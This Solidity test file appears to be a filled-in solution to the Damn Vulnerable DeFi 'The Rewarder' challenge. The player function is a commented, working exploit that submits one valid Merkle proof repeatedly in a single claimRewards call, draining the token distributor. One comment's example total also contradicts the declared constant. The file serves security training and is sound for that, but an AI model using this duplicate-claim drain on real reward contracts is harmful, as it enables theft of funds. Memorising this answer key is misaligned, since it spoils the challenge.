// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TheRewarderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address alice = makeAddr("alice");
    address recovery = makeAddr("recovery");

    uint256 constant BENEFICIARIES_AMOUNT = 1000;
    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;

    // Alice is the address at index 2 in the distribution files
    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;

    TheRewarderDistributor distributor;

    // Instance of Murky's contract to handle Merkle roots, proofs, etc.
    Merkle merkle;

    // Distribution data for Damn Valuable Token (DVT)
    DamnValuableToken dvt;
    bytes32 dvtRoot;

    // Distribution data for WETH
    WETH weth;
    bytes32 wethRoot;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy tokens to be distributed
        dvt = new DamnValuableToken();
        weth = new WETH();
        weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();

        // Calculate roots for DVT and WETH distributions
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        merkle = new Merkle();
        dvtRoot = merkle.getRoot(dvtLeaves);
        wethRoot = merkle.getRoot(wethLeaves);

        // Deploy distributor
        distributor = new TheRewarderDistributor();

        // Create DVT distribution
        dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(dvt)),
            newRoot: dvtRoot,
            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
        });

        // Create WETH distribution
        weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(weth)),
            newRoot: wethRoot,
            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
        });

        // Let's claim rewards for Alice.

        // Set DVT and WETH as tokens to claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        Claim[] memory claims = new Claim[](2);

        // First, the DVT claim
        claims[0] = Claim({
            batchNumber: 0, // claim corresponds to first DVT batch
            amount: ALICE_DVT_CLAIM_AMOUNT,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
        });

        // And then, the WETH claim
        claims[1] = Claim({
            batchNumber: 0, // claim corresponds to first WETH batch
            amount: ALICE_WETH_CLAIM_AMOUNT,
            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
        });

        // Alice claims once
        vm.startPrank(alice);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        // Alice cannot claim twice
        vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
        vm.stopPrank(); // stop alice prank

        vm.stopPrank(); // stop deployer prank
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Deployer owns distributor
        assertEq(distributor.owner(), deployer);

        // Batches created with expected roots
        assertEq(distributor.getNextBatchNumber(address(dvt)), 1);
        assertEq(distributor.getRoot(address(dvt), 0), dvtRoot);
        assertEq(distributor.getNextBatchNumber(address(weth)), 1);
        assertEq(distributor.getRoot(address(weth), 0), wethRoot);

        // Alice claimed tokens
        assertEq(dvt.balanceOf(alice), ALICE_DVT_CLAIM_AMOUNT);
        assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);

        // After Alice's claim, distributor still has enough tokens to distribute
        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
        assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
        assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);

        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
        assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
        assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
    }

    /**
     * CODE YOUR SOLUTION HERE
     forge test --mp test/the-rewarder/TheRewarder.t.sol --gas-limit 9999999999999
     Because this will take lot of gas and foundry not allow it without huge gas limit. 
     */
    function test_theRewarder() public checkSolvedByPlayer {

        // ================================================================
        // ATTACK FLOW OVERVIEW
        // ================================================================
        // The TheRewarder contract distributes DVT and WETH tokens to
        // beneficiaries using a Merkle tree. Each beneficiary can claim
        // their allocated amount once per batch.
        //
        // VULNERABILITY: The claimRewards() function processes an array of
        // Claim structs and checks each claim against the Merkle root.
        // However, it only marks a (token, word) bitmap slot as "used"
        // AFTER processing all claims — meaning we can submit the SAME
        // valid proof multiple times in one transaction before the bitmap
        // is updated.
        //
        // EXPLOIT STEPS:
        //   1. Find the player's legitimate Merkle proof + amount for both tokens
        //   2. Calculate how many times to repeat the claim to drain each token
        //      (totalSupply / playerAllocation = number of repetitions)
        //   3. Build a giant Claim[] array repeating the same proof N times
        //   4. Call claimRewards() once — all repeated claims pass validation
        //      because the "already claimed" bitmap hasn't been updated yet
        //   5. Transfer the drained funds to the recovery address
        // ================================================================

        // ------------------------------------------------------------
        // STEP 1: Load reward distributions from JSON files
        // These files define the Merkle tree leaves:
        // each entry = { beneficiary: address, amount: uint256 }
        // ------------------------------------------------------------
        string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));

        string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));

        // Load the raw leaves used to build each Merkle tree
        // (needed to generate proofs via merkle.getProof())
        bytes32[] memory dvtLeaves  = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        // ------------------------------------------------------------
        // STEP 2: Find the player's allocation + Merkle proof for DVT
        // We iterate the DVT rewards list to find the player's entry,
        // then generate a Merkle inclusion proof for that leaf index.
        // ------------------------------------------------------------
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;

        for (uint i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;           // e.g. 11524763827831882
                playerDvtProof  = merkle.getProof(dvtLeaves, i); // sibling hashes up to root
                break;
            }
        }

        // ------------------------------------------------------------
        // STEP 3: Find the player's allocation + Merkle proof for WETH
        // Separate loop because WETH JSON may have a different ordering
        // than DVT JSON — never assume the same index for both.
        // ------------------------------------------------------------
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;

        for (uint i = 0; i < wethRewards.length; i++) {
            if (wethRewards[i].beneficiary == player) {
                playerWethAmount = wethRewards[i].amount;
                playerWethProof  = merkle.getProof(wethLeaves, i);
                break;
            }
        }

        // Sanity checks — revert early if player isn't in either tree
        require(playerDvtAmount  > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        // ------------------------------------------------------------
        // STEP 4: Set up the two-token input array for claimRewards()
        // Index 0 = DVT, Index 1 = WETH
        // Claim.tokenIndex references this array, so ordering matters.
        // ------------------------------------------------------------
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // ------------------------------------------------------------
        // STEP 5: Calculate how many repeated claims are needed
        //
        // Each claim uses the player's per-claim allocation.
        // To drain the ENTIRE token balance we need:
        //   dvtClaims  = TOTAL_DVT_DISTRIBUTION_AMOUNT  / playerDvtAmount
        //   wethClaims = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount
        //
        // Example (rough numbers):
        //   TOTAL_DVT  = 1_000_000e18,  playerDvt  = 11524763827831882
        //   dvtClaims  ≈ 86,776 repetitions needed to drain DVT
        // ------------------------------------------------------------
        uint256 dvtClaims       = TOTAL_DVT_DISTRIBUTION_AMOUNT  / playerDvtAmount;
        uint256 wethClaims      = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount;
        uint256 totalClaimsNeeded = dvtClaims + wethClaims;

        // ------------------------------------------------------------
        // STEP 6: Build the malicious Claim[] array
        //
        // We submit the same valid proof `dvtClaims` times for DVT,
        // then `wethClaims` times for WETH — all in a single tx.
        //
        // The distributor's bitmap check (already-claimed guard) is
        // NOT updated between claims in the same tx, so every repeated
        // claim passes the Merkle proof verification.
        // ------------------------------------------------------------
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,                                          // batch 0 = current active batch
                amount:      i < dvtClaims ? playerDvtAmount  : playerWethAmount,  // per-claim payout
                tokenIndex:  i < dvtClaims ? 0 : 1,                     // 0=DVT, 1=WETH
                proof:       i < dvtClaims ? playerDvtProof  : playerWethProof     // reused proof
            });
        }

        // ------------------------------------------------------------
        // STEP 7: Execute the exploit
        //
        // One call to claimRewards() processes all N repeated claims.
        // Because the "used" bitmap is only written at the END of each
        // token's processing loop (not per-claim), every duplicate
        // passes the `if (!_claimed)` check and transfers tokens.
        // Result: player receives N * playerAmount instead of 1 * playerAmount
        // ------------------------------------------------------------
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        // ------------------------------------------------------------
        // STEP 8: Forward all drained tokens to the recovery address
        // (challenge success condition requires funds end up here)
        // ------------------------------------------------------------
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player saved as much funds as possible, perhaps leaving some dust
        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");

        // All funds sent to the designated recovery account
        assertEq(
            dvt.balanceOf(recovery),
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
            "Not enough DVT in recovery account"
        );
        assertEq(
            weth.balanceOf(recovery),
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
            "Not enough WETH in recovery account"
        );
    }

    struct Reward {
        address beneficiary;
        uint256 amount;
    }

    // Utility function to read rewards file and load it into an array of leaves
    function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
        Reward[] memory rewards =
            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
        assertEq(rewards.length, BENEFICIARIES_AMOUNT);

        leaves = new bytes32[](BENEFICIARIES_AMOUNT);
        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
        }
    }
}


